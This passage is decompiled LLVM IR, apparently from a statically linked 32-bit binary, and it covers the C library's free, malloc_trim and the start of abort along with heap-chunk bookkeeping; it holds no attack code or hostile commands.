  store i32 0, i32* %v2_804cc28, align 4
  %v0_804cc32 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc32 = add i32 %v0_804cc32, 852
  %v2_804cc32 = inttoptr i32 %v1_804cc32 to i32*
  store i32 65536, i32* %v2_804cc32, align 4
  %v0_804cc3c = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc3c = add i32 %v0_804cc3c, 844
  %v2_804cc3c = inttoptr i32 %v1_804cc3c to i32*
  store i32 262144, i32* %v2_804cc3c, align 4
  %v0_804cc46 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cc46 = add i32 %v0_804cc46, 836
  %v2_804cc46 = inttoptr i32 %v1_804cc46 to i32*
  store i32 262144, i32* %v2_804cc46, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_804cc57 = load i32, i32* %arg1, align 4
  %v1_804cc59 = urem i32 %v2_804cc57, 4
  %v1_804cc5c = or i32 %v1_804cc59, 72
  store i32 %v1_804cc5c, i32* %arg1, align 4
  %v0_804cc61 = load i32, i32* @edx, align 4
  %v1_804cc63 = add i32 %v0_804cc61, 52
  store i32 %v1_804cc63, i32* %eax.global-to-local, align 4
  %v2_804cc66 = add i32 %v0_804cc61, 44
  %v3_804cc66 = inttoptr i32 %v2_804cc66 to i32*
  store i32 %v1_804cc63, i32* %v3_804cc66, align 4
  %v1_804cc6b = call i32 @sysconf(i32 30)
  store i32 %v1_804cc6b, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_804cc77 = add i32 %tmp11, 860
  %v3_804cc77 = inttoptr i32 %v2_804cc77 to i32*
  store i32 %v1_804cc6b, i32* %v3_804cc77, align 4
  br label %dec_label_pc_804cc7d

dec_label_pc_804cc7d:                             ; preds = %dec_label_pc_804cbf5, %dec_label_pc_804cc1d
  store i32 %v0_804cae0, i32* @ebx, align 4
  store i32 %v0_804cadf, i32* @esi, align 4
  store i32 %v0_804cade, i32* @edi, align 4
  %v0_804cc84 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804cc84

; uselistorder directives
  uselistorder i32 %v0_804cc15, { 1, 0 }
  uselistorder i32 %v0_804cbd1, { 1, 0 }
  uselistorder i32 %v1_804cb8f, { 1, 0 }
  uselistorder i32 %v2_804cb88, { 1, 0 }
  uselistorder i32 %v1_804cb80, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804cb8c, { 1, 0 }
  uselistorder i32 %v3_804cb3b, { 2, 1, 3, 0 }
  uselistorder i32 %v0_804cb58, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804cb35, { 1, 0, 3, 2 }
  uselistorder i32* %v3_804cbe6, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_804cc7d, { 1, 0 }
  uselistorder label %dec_label_pc_804cc09, { 1, 0 }
  uselistorder label %dec_label_pc_804cbe9, { 1, 0 }
  uselistorder label %dec_label_pc_804cbb5, { 1, 0 }
  uselistorder label %dec_label_pc_804cbad, { 1, 0 }
  uselistorder label %dec_label_pc_804cb78, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804cc85 = load i32, i32* @ebp, align 4
  %v0_804cc86 = load i32, i32* @edi, align 4
  %v0_804cc87 = load i32, i32* @esi, align 4
  %v0_804cc88 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804cc90 = icmp eq i32 %arg1, 0
  br i1 %v1_804cc90, label %dec_label_pc_804ce19, label %dec_label_pc_804cc98

dec_label_pc_804cc98:                             ; preds = %entry
  %v2_804cca3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804cca3, i32* @eax, align 4
  %v2_804cca8 = call i32 @__pthread_return_void(i32 %v2_804cca3, i32 134535499)
  store i32 %v2_804cca8, i32* %eax.global-to-local, align 4
  %v1_804ccb4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053610.341 to i32))
  %v1_804ccb9 = add i32 %arg1, -8
  store i32 %v1_804ccb9, i32* @ecx, align 4
  %v0_804ccbc = load i8, i8* @global_var_8055e40.342, align 1
  %v1_804ccbc = sext i8 %v0_804ccbc to i32
  store i32 %v1_804ccbc, i32* %eax.global-to-local, align 4
  %v1_804ccc1 = add i32 %arg1, -4
  %v2_804ccc1 = inttoptr i32 %v1_804ccc1 to i32*
  %v3_804ccc1 = load i32, i32* %v2_804ccc1, align 4
  store i32 %v3_804ccc1, i32* @edx, align 4
  %v1_804ccc9 = and i32 %v3_804ccc1, -4
  %v4_804ccc9 = trunc i32 %v1_804ccc9 to i8
  store i32 %v1_804ccc9, i32* @ebx, align 4
  %v8_804ccce = icmp ugt i8 %v4_804ccc9, %v0_804ccbc
  br i1 %v8_804ccce, label %dec_label_pc_804ccf0, label %dec_label_pc_804ccd0

dec_label_pc_804ccd0:                             ; preds = %dec_label_pc_804cc98
  %v1_804ccd0 = or i32 %v1_804ccbc, 3
  %v3_804ccd0 = trunc i32 %v1_804ccd0 to i8
  store i32 %v1_804ccd0, i32* %eax.global-to-local, align 4
  %v2_804ccd3 = udiv i32 %v3_804ccc1, 8
  store i8 %v3_804ccd0, i8* @global_var_8055e40.342, align 64
  %v1_804ccdb = mul nuw i32 %v2_804ccd3, 4
  %v2_804ccdb = add i32 %v1_804ccdb, ptrtoint (i8* @global_var_8055e40.342 to i32)
  store i32 %v2_804ccdb, i32* @edx, align 4
  %v1_804cce2 = add i32 %v1_804ccdb, add (i32 ptrtoint (i8* @global_var_8055e40.342 to i32), i32 -4)
  %v2_804cce2 = inttoptr i32 %v1_804cce2 to i32*
  %v3_804cce2 = load i32, i32* %v2_804cce2, align 4
  store i32 %v3_804cce2, i32* %eax.global-to-local, align 4
  %v3_804cce5 = inttoptr i32 %arg1 to i32*
  store i32 %v3_804cce2, i32* %v3_804cce5, align 4
  %v0_804cce8 = load i32, i32* @ecx, align 4
  %v1_804cce8 = load i32, i32* @edx, align 4
  %v2_804cce8 = add i32 %v1_804cce8, -4
  %v3_804cce8 = inttoptr i32 %v2_804cce8 to i32*
  store i32 %v0_804cce8, i32* %v3_804cce8, align 4
  br label %dec_label_pc_804ce08

dec_label_pc_804ccf0:                             ; preds = %dec_label_pc_804cc98
  %v2_804ccf0 = and i32 %v3_804ccc1, 2
  %v3_804ccf0 = icmp eq i32 %v2_804ccf0, 0
  %v1_804ccf3 = icmp eq i1 %v3_804ccf0, false
  br i1 %v1_804ccf3, label %dec_label_pc_804cde8, label %dec_label_pc_804ccf9

dec_label_pc_804ccf9:                             ; preds = %dec_label_pc_804ccf0
  %v1_804ccf9 = or i32 %v1_804ccbc, 1
  %v3_804ccf9 = trunc i32 %v1_804ccf9 to i8
  store i32 %v1_804ccf9, i32* %eax.global-to-local, align 4
  store i8 %v3_804ccf9, i8* @global_var_8055e40.342, align 64
  %v2_804cd01 = add i32 %v1_804ccc9, %v1_804ccb9
  store i32 %v2_804cd01, i32* @esi, align 4
  %v1_804cd04 = add i32 %v2_804cd01, 4
  %v2_804cd04 = inttoptr i32 %v1_804cd04 to i32*
  %v3_804cd04 = load i32, i32* %v2_804cd04, align 4
  store i32 %v3_804cd04, i32* %eax.global-to-local, align 4
  %v2_804cd0b = inttoptr i32 %v1_804ccc1 to i8*
  %v3_804cd0b = load i8, i8* %v2_804cd0b, align 1
  %v4_804cd0b = urem i8 %v3_804cd0b, 2
  %v5_804cd0b = icmp eq i8 %v4_804cd0b, 0
  %v1_804cd0f = icmp eq i1 %v5_804cd0b, false
  br i1 %v1_804cd0f, label %dec_label_pc_804cd32, label %dec_label_pc_804cd11

dec_label_pc_804cd11:                             ; preds = %dec_label_pc_804ccf9
  %v2_804cd11 = inttoptr i32 %v1_804ccb9 to i32*
  %v3_804cd11 = load i32, i32* %v2_804cd11, align 4
  store i32 %v3_804cd11, i32* @ebp, align 4
  %v2_804cd16 = sub i32 %v1_804ccb9, %v3_804cd11
  store i32 %v2_804cd16, i32* %eax.global-to-local, align 4
  %v1_804cd18 = add i32 %v2_804cd16, 8
  %v2_804cd18 = inttoptr i32 %v1_804cd18 to i32*
  %v3_804cd18 = load i32, i32* %v2_804cd18, align 4
  store i32 %v3_804cd18, i32* @edi, align 4
  %v1_804cd1b = add i32 %v2_804cd16, 12
  %v2_804cd1b = inttoptr i32 %v1_804cd1b to i32*
  %v3_804cd1b = load i32, i32* %v2_804cd1b, align 4
  store i32 %v3_804cd1b, i32* @edx, align 4
  %v1_804cd1e = add i32 %v3_804cd18, 12
  %v2_804cd1e = inttoptr i32 %v1_804cd1e to i32*
  %v3_804cd1e = load i32, i32* %v2_804cd1e, align 4
  store i32 %v3_804cd1e, i32* @ecx, align 4
  %v12_804cd21 = icmp eq i32 %v3_804cd1e, %v2_804cd16
  %v1_804cd23 = icmp eq i1 %v12_804cd21, false
  br i1 %v1_804cd23, label %dec_label_pc_804cd61, label %dec_label_pc_804cd25

dec_label_pc_804cd25:                             ; preds = %dec_label_pc_804cd11
  %v1_804cd25 = add i32 %v3_804cd1b, 8
  %v2_804cd25 = inttoptr i32 %v1_804cd25 to i32*
  %v3_804cd25 = load i32, i32* %v2_804cd25, align 4
  %v15_804cd25 = icmp eq i32 %v3_804cd25, %v3_804cd1e
  %v1_804cd28 = icmp eq i1 %v15_804cd25, false
  br i1 %v1_804cd28, label %dec_label_pc_804cd61, label %dec_label_pc_804cd2a

dec_label_pc_804cd2a:                             ; preds = %dec_label_pc_804cd25
  %v2_804cd2a = add i32 %v3_804cd11, %v1_804ccc9
  store i32 %v2_804cd2a, i32* @ebx, align 4
  store i32 %v3_804cd1b, i32* %v2_804cd1e, align 4
  %v0_804cd2f = load i32, i32* @edi, align 4
  %v1_804cd2f = load i32, i32* @edx, align 4
  %v2_804cd2f = add i32 %v1_804cd2f, 8
  %v3_804cd2f = inttoptr i32 %v2_804cd2f to i32*
  store i32 %v0_804cd2f, i32* %v3_804cd2f, align 4
  %v0_804cd39.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cd32

dec_label_pc_804cd32:                             ; preds = %dec_label_pc_804ccf9, %dec_label_pc_804cd2a
  %v1_804cd45 = phi i32 [ %v2_804cd01, %dec_label_pc_804ccf9 ], [ %v0_804cd39.pre, %dec_label_pc_804cd2a ]
  %v1_804cd36 = and i32 %v3_804cd04, -4
  store i32 %v1_804cd36, i32* @ebp, align 4
  %v1_804cd39 = load i32, i32* @global_var_8055e6c.343, align 4
  %v12_804cd39 = icmp eq i32 %v1_804cd45, %v1_804cd39
  br i1 %v12_804cd39, label %dec_label_pc_804cd93, label %dec_label_pc_804cd41

dec_label_pc_804cd41:                             ; preds = %dec_label_pc_804cd32
  %v2_804cd41 = add i32 %v1_804cd45, 4
  %v3_804cd41 = add i32 %v2_804cd41, %v1_804cd36
  %v4_804cd41 = inttoptr i32 %v3_804cd41 to i32*
  %v5_804cd41 = load i32, i32* %v4_804cd41, align 4
  store i32 %v5_804cd41, i32* %eax.global-to-local, align 4
  %v3_804cd45 = inttoptr i32 %v2_804cd41 to i32*
  store i32 %v1_804cd36, i32* %v3_804cd45, align 4
  %v0_804cd48 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cd48 = urem i32 %v0_804cd48, 2
  %v2_804cd48 = icmp eq i32 %v1_804cd48, 0
  store i32 %v1_804cd48, i32* %eax.global-to-local, align 4
  %v1_804cd4d = icmp eq i1 %v2_804cd48, false
  br i1 %v1_804cd4d, label %dec_label_pc_804cd6e, label %dec_label_pc_804cd4f

dec_label_pc_804cd4f:                             ; preds = %dec_label_pc_804cd41
  %v0_804cd4f = load i32, i32* @esi, align 4
  %v1_804cd4f = add i32 %v0_804cd4f, 8
  %v2_804cd4f = inttoptr i32 %v1_804cd4f to i32*
  %v3_804cd4f = load i32, i32* %v2_804cd4f, align 4
  store i32 %v3_804cd4f, i32* @edx, align 4
  %v1_804cd52 = add i32 %v0_804cd4f, 12
  %v2_804cd52 = inttoptr i32 %v1_804cd52 to i32*
  %v3_804cd52 = load i32, i32* %v2_804cd52, align 4
  store i32 %v3_804cd52, i32* %eax.global-to-local, align 4
  %v1_804cd55 = add i32 %v3_804cd4f, 12
  %v2_804cd55 = inttoptr i32 %v1_804cd55 to i32*
  %v3_804cd55 = load i32, i32* %v2_804cd55, align 4
  store i32 %v3_804cd55, i32* @edi, align 4
  %v12_804cd58 = icmp eq i32 %v3_804cd55, %v0_804cd4f
  %v1_804cd5a = icmp eq i1 %v12_804cd58, false
  br i1 %v1_804cd5a, label %dec_label_pc_804cd61, label %dec_label_pc_804cd5c

dec_label_pc_804cd5c:                             ; preds = %dec_label_pc_804cd4f
  %v1_804cd5c = add i32 %v3_804cd52, 8
  %v2_804cd5c = inttoptr i32 %v1_804cd5c to i32*
  %v3_804cd5c = load i32, i32* %v2_804cd5c, align 4
  %v15_804cd5c = icmp eq i32 %v3_804cd5c, %v3_804cd55
  br i1 %v15_804cd5c, label %dec_label_pc_804cd66, label %dec_label_pc_804cd61

dec_label_pc_804cd61:                             ; preds = %dec_label_pc_804cd5c, %dec_label_pc_804cd4f, %dec_label_pc_804cd25, %dec_label_pc_804cd11
  %v0_804cd61 = call i32 @abort()
  store i32 %v0_804cd61, i32* %eax.global-to-local, align 4
  %v1_804cd66.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804cd66

dec_label_pc_804cd66:                             ; preds = %dec_label_pc_804cd5c, %dec_label_pc_804cd61
  %v1_804cd66 = phi i32 [ %v3_804cd4f, %dec_label_pc_804cd5c ], [ %v1_804cd66.pre, %dec_label_pc_804cd61 ]
  %v0_804cd66 = phi i32 [ %v3_804cd52, %dec_label_pc_804cd5c ], [ %v0_804cd61, %dec_label_pc_804cd61 ]
  %v2_804cd66 = add i32 %v1_804cd66, 12
  %v3_804cd66 = inttoptr i32 %v2_804cd66 to i32*
  store i32 %v0_804cd66, i32* %v3_804cd66, align 4
  %v0_804cd69 = load i32, i32* @ebx, align 4
  %v1_804cd69 = load i32, i32* @ebp, align 4
  %v2_804cd69 = add i32 %v1_804cd69, %v0_804cd69
  store i32 %v2_804cd69, i32* @ebx, align 4
  %v0_804cd6b = load i32, i32* @edx, align 4
  %v1_804cd6b = load i32, i32* %eax.global-to-local, align 4
  %v2_804cd6b = add i32 %v1_804cd6b, 8
  %v3_804cd6b = inttoptr i32 %v2_804cd6b to i32*
  store i32 %v0_804cd6b, i32* %v3_804cd6b, align 4
  br label %dec_label_pc_804cd6e

dec_label_pc_804cd6e:                             ; preds = %dec_label_pc_804cd41, %dec_label_pc_804cd66
  %v0_804cd6e = load i32, i32* @global_var_8055e7c.361, align 4
  store i32 %v0_804cd6e, i32* %eax.global-to-local, align 4
  %v0_804cd73 = load i32, i32* @ecx, align 4
  %v1_804cd73 = add i32 %v0_804cd73, 12
  %v2_804cd73 = inttoptr i32 %v1_804cd73 to i32*
  store i32 ptrtoint (i32* @global_var_8055e74.345 to i32), i32* %v2_804cd73, align 4
  %v0_804cd7a = load i32, i32* @ebx, align 4
  %v1_804cd7a = load i32, i32* @ecx, align 4
  %v3_804cd7a = add i32 %v1_804cd7a, %v0_804cd7a
  %v4_804cd7a = inttoptr i32 %v3_804cd7a to i32*
  store i32 %v0_804cd7a, i32* %v4_804cd7a, align 4
  %v0_804cd7d = load i32, i32* %eax.global-to-local, align 4
  %v1_804cd7d = load i32, i32* @ecx, align 4
  %v2_804cd7d = add i32 %v1_804cd7d, 8
  %v3_804cd7d = inttoptr i32 %v2_804cd7d to i32*
  store i32 %v0_804cd7d, i32* %v3_804cd7d, align 4
  %v0_804cd80 = load i32, i32* @ecx, align 4
  %v1_804cd80 = load i32, i32* %eax.global-to-local, align 4
  %v2_804cd80 = add i32 %v1_804cd80, 12
  %v3_804cd80 = inttoptr i32 %v2_804cd80 to i32*
  store i32 %v0_804cd80, i32* %v3_804cd80, align 4
  %v0_804cd83 = load i32, i32* @ebx, align 4
  %v1_804cd85 = or i32 %v0_804cd83, 1
  store i32 %v1_804cd85, i32* %eax.global-to-local, align 4
  %v0_804cd88 = load i32, i32* @ecx, align 4
  store i32 %v0_804cd88, i32* @global_var_8055e7c.361, align 4
  %v2_804cd8e = add i32 %v0_804cd88, 4
  %v3_804cd8e = inttoptr i32 %v2_804cd8e to i32*
  store i32 %v1_804cd85, i32* %v3_804cd8e, align 4
  br label %dec_label_pc_804cda3

dec_label_pc_804cd93:                             ; preds = %dec_label_pc_804cd32
  %v0_804cd93 = load i32, i32* @ebx, align 4
  %v2_804cd93 = add i32 %v0_804cd93, %v1_804cd36
  store i32 %v2_804cd93, i32* @ebx, align 4
  %v1_804cd97 = or i32 %v2_804cd93, 1
  store i32 %v1_804cd97, i32* %eax.global-to-local, align 4
  %v1_804cd9a = load i32, i32* @ecx, align 4
  %v2_804cd9a = add i32 %v1_804cd9a, 4
  %v3_804cd9a = inttoptr i32 %v2_804cd9a to i32*
  store i32 %v1_804cd97, i32* %v3_804cd9a, align 4
  %v0_804cd9d = load i32, i32* @ecx, align 4
  store i32 %v0_804cd9d, i32* @global_var_8055e6c.343, align 4
  br label %dec_label_pc_804cda3

dec_label_pc_804cda3:                             ; preds = %dec_label_pc_804cd6e, %dec_label_pc_804cd93
  %v0_804cda3 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_804cda3, 131072
  br i1 %tmp, label %dec_label_pc_804ce08, label %dec_label_pc_804cdab

dec_label_pc_804cdab:                             ; preds = %dec_label_pc_804cda3
  %v0_804cdab = load i8, i8* @global_var_8055e40.342, align 64
  %v1_804cdab = and i8 %v0_804cdab, 2
  %v2_804cdab = icmp eq i8 %v1_804cdab, 0
  br i1 %v2_804cdab, label %dec_label_pc_804cdc4, label %dec_label_pc_804cdb4

dec_label_pc_804cdb4:                             ; preds = %dec_label_pc_804cdab
  %v2_804cdbc = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8055e40.342 to i32*))
  store i32 %v2_804cdbc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cdc4

dec_label_pc_804cdc4:                             ; preds = %dec_label_pc_804cdab, %dec_label_pc_804cdb4
  %v0_804cdc4 = load i32, i32* @global_var_8055e6c.343, align 4
  store i32 %v0_804cdc4, i32* %eax.global-to-local, align 4
  %v1_804cdc9 = add i32 %v0_804cdc4, 4
  %v2_804cdc9 = inttoptr i32 %v1_804cdc9 to i32*
  %v3_804cdc9 = load i32, i32* %v2_804cdc9, align 4
  %v1_804cdcc = and i32 %v3_804cdc9, -4
  store i32 %v1_804cdcc, i32* %eax.global-to-local, align 4
  %v1_804cdcf = load i32, i32* @global_var_8056184.359, align 4
  %v7_804cdcf = icmp ult i32 %v1_804cdcc, %v1_804cdcf
  br i1 %v7_804cdcf, label %dec_label_pc_804ce08, label %dec_label_pc_804cdd7

dec_label_pc_804cdd7:                             ; preds = %dec_label_pc_804cdc4
  %v0_804cdd7 = load i32, i32* @global_var_8056188.357, align 8
  store i32 %v0_804cdd7, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8055e40.342 to i32), i32* @edx, align 4
  %v0_804cde1 = call i32 @__malloc_trim()
  store i32 %v0_804cde1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ce08

dec_label_pc_804cde8:                             ; preds = %dec_label_pc_804ccf0
  %v2_804cde8 = inttoptr i32 %v1_804ccb9 to i32*
  %v3_804cde8 = load i32, i32* %v2_804cde8, align 4
  %v0_804cdeb = load i32, i32* @global_var_8056190.350, align 16
  %v1_804cdeb = add i32 %v0_804cdeb, -1
  store i32 %v1_804cdeb, i32* @global_var_8056190.350, align 16
  %v2_804cdf1 = add i32 %v3_804cde8, %v1_804ccc9
  store i32 %v2_804cdf1, i32* %eax.global-to-local, align 4
  %v2_804cdf4 = sub i32 %v1_804ccb9, %v3_804cde8
  %v0_804cdfa = load i32, i32* @global_var_80561a4.354, align 4
  %v2_804cdfa = sub i32 %v0_804cdfa, %v2_804cdf1
  store i32 %v2_804cdfa, i32* @global_var_80561a4.354, align 4
  %v4_804ce00 = call i32 @munmap(i32 %v2_804cdf4, i32 %v2_804cdf1, i32 %v1_804ccc9, i32 %v1_804ccc9)
  store i32 %v4_804ce00, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ce08

dec_label_pc_804ce08:                             ; preds = %dec_label_pc_804cdc4, %dec_label_pc_804cda3, %dec_label_pc_804cdd7, %dec_label_pc_804ccd0, %dec_label_pc_804cde8
  store i32 %v2_804cca3, i32* @eax, align 4
  %v2_804ce11 = call i32 @__pthread_return_void(i32 %v2_804cca3, i32 1)
  store i32 %v2_804ce11, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ce19

dec_label_pc_804ce19:                             ; preds = %entry, %dec_label_pc_804ce08
  %.0 = phi i32 [ undef, %entry ], [ %v2_804ce11, %dec_label_pc_804ce08 ]
  store i32 %v0_804cc88, i32* @ebx, align 4
  store i32 %v0_804cc87, i32* @esi, align 4
  store i32 %v0_804cc86, i32* @edi, align 4
  store i32 %v0_804cc85, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_804cde8, { 1, 0 }
  uselistorder i32 %v0_804cd7a, { 1, 0 }
  uselistorder i32 %v1_804cd48, { 1, 0 }
  uselistorder i32 %v2_804cd41, { 1, 0 }
  uselistorder i32 %v1_804cd36, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804cd45, { 1, 0 }
  uselistorder i32 %v1_804ccc9, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_804ccc1, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804ccb9, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8055e40.342 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8055e74.345 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_8055e6c.343, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_8053610.341 to i32), { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_804ce19, { 1, 0 }
  uselistorder label %dec_label_pc_804ce08, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804cdc4, { 1, 0 }
  uselistorder label %dec_label_pc_804cda3, { 1, 0 }
  uselistorder label %dec_label_pc_804cd6e, { 1, 0 }
  uselistorder label %dec_label_pc_804cd66, { 1, 0 }
  uselistorder label %dec_label_pc_804cd32, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804ce21 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804ce2e = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8055e40.342 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_8055e40.342 to i32), i32* @edx, align 4
  %v0_804ce3b = load i32, i32* @ebx, align 4
  store i32 %v0_804ce3b, i32* @eax, align 4
  store i32 %v0_804ce21, i32* @ebx, align 4
  %v0_804ce3e = call i32 @__malloc_trim()
  ret i32 %v0_804ce3e

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8055e40.342 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i32 (i32*)* @__malloc_consolidate, { 0, 4, 1, 2, 3 }
  uselistorder i8* @global_var_8055e40.342, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_804ce50 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053628.362 to i32))
  %v12_804ce5a = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ce5f

dec_label_pc_804ce5f:                             ; preds = %dec_label_pc_804ce5f.dec_label_pc_804ce5f_crit_edge, %entry
  %v0_804ce5f = phi i32 [ %v12_804ce5a, %entry ], [ %v0_804ce5f.pre, %dec_label_pc_804ce5f.dec_label_pc_804ce5f_crit_edge ]
  %v1_804ce6a19 = phi i32 [ 31, %entry ], [ %v1_804ce6a, %dec_label_pc_804ce5f.dec_label_pc_804ce5f_crit_edge ]
  %v2_804ce5f = mul i32 %v1_804ce6a19, 4
  %v3_804ce5f = add i32 %v2_804ce5f, 152
  %v4_804ce5f = add i32 %v3_804ce5f, %v0_804ce5f
  %v5_804ce5f = inttoptr i32 %v4_804ce5f to i32*
  store i32 0, i32* %v5_804ce5f, align 4
  %v0_804ce6a.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804ce6a = add i32 %v0_804ce6a.pre, -1
  %v9_804ce6a = icmp slt i32 %v1_804ce6a, 0
  store i32 %v1_804ce6a, i32* %eax.global-to-local, align 4
  %v1_804ce6b = icmp eq i1 %v9_804ce6a, false
  br i1 %v1_804ce6b, label %dec_label_pc_804ce5f.dec_label_pc_804ce5f_crit_edge, label %dec_label_pc_804ce6d

dec_label_pc_804ce5f.dec_label_pc_804ce5f_crit_edge: ; preds = %dec_label_pc_804ce5f
  %v0_804ce5f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ce5f

dec_label_pc_804ce6d:                             ; preds = %dec_label_pc_804ce5f
  %v0_804ce6d = load i32, i32* @ebx, align 4
  %v2_804ce71 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804ce71, i32* @ebx, align 4
  %v4_804ce79 = call i32 @__sigaddset(i32 %v2_804ce71, i32 6, i32 %v0_804ce6d, i32 %v0_804ce6d)
  store i32 %v4_804ce79, i32* %eax.global-to-local, align 4
  %v1_804ce81 = icmp eq i32 %v4_804ce79, 0
  %v1_804ce83 = icmp eq i1 %v1_804ce81, false
  br i1 %v1_804ce83, label %dec_label_pc_804ce93, label %dec_label_pc_804ce85

dec_label_pc_804ce85:                             ; preds = %dec_label_pc_804ce6d
  %v3_804ce8b = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_804ce8b = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_804ce8b, i32 0)
  store i32 %v4_804ce8b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ce93

dec_label_pc_804ce93:                             ; preds = %dec_label_pc_804ce6d, %dec_label_pc_804ce85
  %v2_804cecb4 = phi i32 [ %v4_804ce79, %dec_label_pc_804ce6d ], [ %v4_804ce8b, %dec_label_pc_804ce85 ]
  %v0_804ce93 = load i8, i8* @global_var_8055dc0.363, align 64
  %v1_804ce93 = icmp eq i8 %v0_804ce93, 0
  %v1_804ce9a = icmp eq i1 %v1_804ce93, false
  br i1 %v1_804ce9a, label %dec_label_pc_804cecb, label %dec_label_pc_804ce9c

dec_label_pc_804ce9c:                             ; preds = %dec_label_pc_804ce93
  store i8 1, i8* @global_var_8055dc0.363, align 64
  br label %dec_label_pc_804cea3

dec_label_pc_804cea3:                             ; preds = %dec_label_pc_804cf0a, %dec_label_pc_804ce9c
  %v1_804ceab = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053628.362 to i32))
  store i32 %v1_804ceab, i32* %eax.global-to-local, align 4
  %v1_804ceb7 = call i32 @__raise(i32 6)
  store i32 %v1_804ceb7, i32* %eax.global-to-local, align 4
  %v1_804cec3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053628.362 to i32))
  store i32 %v1_804cec3, i32* %eax.global-to-local, align 4
  %v0_804cecb.pre = load i8, i8* @global_var_8055dc0.363, align 64
  br label %dec_label_pc_804cecb

dec_label_pc_804cecb:                             ; preds = %dec_label_pc_804ce93, %dec_label_pc_804cea3
  %v2_804cecb = phi i32 [ %v2_804cecb4, %dec_label_pc_804ce93 ], [ %v1_804cec3, %dec_label_pc_804cea3 ]
  %v0_804cecb = phi i8 [ %v0_804ce93, %dec_label_pc_804ce93 ], [ %v0_804cecb.pre, %dec_label_pc_804cea3 ]
  %v1_804cecb = zext i8 %v0_804cecb to i32
  %v3_804cecb = and i32 %v2_804cecb, -256
  %v4_804cecb = or i32 %v1_804cecb, %v3_804cecb
  store i32 %v4_804cecb, i32* %eax.global-to-local, align 4
  %v10_804ced0 = icmp eq i8 %v0_804cecb, 1
  %v1_804ced2 = icmp eq i1 %v10_804ced0, false
  br i1 %v1_804ced2, label %dec_label_pc_804cf2c, label %dec_label_pc_804ced4

dec_label_pc_804ced4:                             ; preds = %dec_label_pc_804cecb
  %v2_804cedc = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_804cedc, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_8055dc0.363, align 64
  %v3_804cee8 = bitcast i32* %stack_var_-272 to i8*
  %v4_804cee8 = call i32 @__GI_memset(i8* %v3_804cee8, i32 0, i32 140)
